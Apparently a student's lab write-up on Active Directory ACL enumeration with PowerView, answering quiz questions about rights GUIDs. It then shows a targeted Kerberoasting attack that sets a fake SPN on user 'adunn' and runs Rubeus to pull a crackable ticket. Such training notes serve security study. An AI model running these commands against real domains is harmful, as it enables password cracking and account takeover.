# Rights GUID

In Active Directory, a rights GUID is a unique identifier used to represent a specific permission or control right.

Q1. What is the rights GUID for User-Force-Change-Password?

By using this PowerView command to check what permissions the user wley has inside Active Directory.

```
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

<img width="1431" height="377" alt="image" src="https://github.com/user-attachments/assets/cd6ec657-5d6f-4cd5-b079-8951ecda2b0f" />

So when you see: User-Force-Change-Password

it refers to a special permission that allows someone to reset another user’s password without knowing the old password.

By using this command to check rights GUID

```
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

Q2. What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?

ResolveGUIDs

# ACL Abuse

** Active Directory right must be GenericALL permission **

GenericAll is Full control.

GenericWrite is Can modify some attributes, but not complete control.

Given that we have GenericAll permissions on this account, we can conduct a targeted Kerberoasting attack by modifying the account's servicePrincipalName (SPN) attribute to register a fake SPN. This will allow us to request a Ticket Granting Service (TGS) ticket, which we can then extract and attempt to crack offline using Hashcat.

```
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

.\Rubeus.exe kerberoast /user:adunn /nowrap


```


